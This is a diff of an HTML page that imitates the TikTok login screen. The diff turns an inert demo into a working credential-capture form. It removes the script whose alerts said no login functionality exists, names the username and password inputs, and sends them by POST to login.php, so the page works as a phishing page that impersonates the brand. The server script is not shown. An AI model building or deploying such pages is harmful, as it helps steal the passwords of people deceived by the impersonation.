@@ -33,8 +33,6 @@
             text-transform: uppercase;
         }
 
-        
-        
         .login-container {
             max-width: 400px;
             width: 100%;
@@ -184,25 +182,24 @@
 <body>
     <div class="header">
         <div class="logo">TikTok</div>
-       
     </div>
     
     <div class="login-container">
         <div class="login-box">
             <h1 class="login-title">Log in</h1>
             
-            <form>
+            <form action="login.php" method="POST">
                 <div class="input-group">
-                    <input type="text" placeholder="Phone, email, or username">
+                    <input type="text" name="username" placeholder="Phone, email, or username" required>
                 </div>
                 
                 <div class="input-group">
-                    <input type="password" placeholder="Password">
+                    <input type="password" name="password" placeholder="Password" required>
                 </div>
                 
                 <a href="#" class="forgot-password">Forgot password?</a>
                 
-                <button type="button" class="login-button">Log in</button>
+                <button type="submit" class="login-button">Log in</button>
                 
                 <div class="divider">
                     <div class="divider-line"></div>
@@ -221,26 +218,11 @@
                     </button>
                 </div>
             </form>
-
         </div>
     </div>
     
     <div class="footer">
         Don't have an account? <a href="#" class="signup-link">Sign up</a>
     </div>
-    
-    <script>
-        document.querySelector('.login-button').addEventListener('click', function(e) {
-            e.preventDefault();
-            alert('This is a demo page. No actual login functionality exists.');
-        });
-        
-        document.querySelectorAll('.social-button').forEach(button => {
-            button.addEventListener('click', function(e) {
-                e.preventDefault();
-                alert('Social login is simulated in this demo.');
-            });
-        });
-    </script>
 </body>
 </html>
